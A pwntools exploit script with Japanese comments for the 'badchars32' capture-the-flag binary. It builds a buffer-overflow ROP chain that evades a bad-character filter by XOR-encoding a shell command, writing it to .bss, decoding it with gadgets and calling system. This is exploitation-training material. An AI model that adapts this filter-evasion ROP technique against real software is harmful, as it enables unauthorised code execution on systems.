'''
ebp-0x2c <- buffer_address( buffer[200] )
ebp-0x30(str) <- nstrlen( buf, size, )
checkBadchars( str, strlen )
memcpy( ebp-0x28, buf, size )

nstrlen: 0xa(改行コード含む）までの文字数
checkBadchars: b,i,c,/, ,f => 0xebに置き換える

考え方
"/bin/cat flag.txt"のb,i,c,/, ,f,n,sについてxorを取り、変換されるのを回避する
xorした文字列をbssに入れる
ROPで、変換した箇所だけxorでデコードする
最後にsystem(bss)を実行
'''

from pwn import *

elf = ELF("./badchars32")
p = remote( 'localhost', 7777 )
#p = process("./badchars32")

payload = b''
payload += b'A'*0x28
payload += b'BBBB'

#encode command
#command = b"/bin////cat flag.txt" #OK
#command = b"/bin/ls" #OK
#command = b"/bin/cat flag.txt" #NG
#command = b"/bin/cat flag.txt " #NG
command = b"/bin/cat flag.txt  " #OK
command = b"/bin/ls          "
en_command = b""
for c in command:
    if chr(c) in [ 'b','i','c','/',' ','f','n','s' ]:
        c = c^0xff
    en_command += c.to_bytes(1,'big')
info("command: %s"%command )
info("en_command: %s"%en_command )

#4bytesずつbssに書き込む
bss = 0x0804a040
for i in range(0, len(en_command), 4 ):
    payload += p32( 0x8048899 ) #pop esi,pop edi, ret
    payload += en_command[i:i+4].ljust(4,b'\x00')
    payload += p32( bss+i )
    payload += p32( 0x8048893 ) #mov [edi],esi
    info( "%#x <== %s\t(%s)"%( bss+i, en_command[i:i+4].ljust(4,b'\0'), command[i:i+4].ljust(4,b'\0') ) )

#decode command in bss
for i in range( len(en_command) ):
    if command[i] != en_command[i]:
        payload += p32( 0x8048896 ) #pop ebx,pop ecx,ret
        payload += p32( bss+i )
        payload += p32( 0xff )
        payload += p32( 0x8048890 ) #xor [ebx], cl
        info("[%#x] %x ^ 0xff ==> %c"%(bss+i,en_command[i], en_command[i]^0xff))

#call system("/bin/cat flag.txt")
payload += p32( 0x80484e0 ) #system@plt
payload += b'CCCC'
payload += p32( bss ) #/bin/cat flag.txt

print( p.recvuntil("\n> ") )
p.sendline( payload )

print( p.recv() )
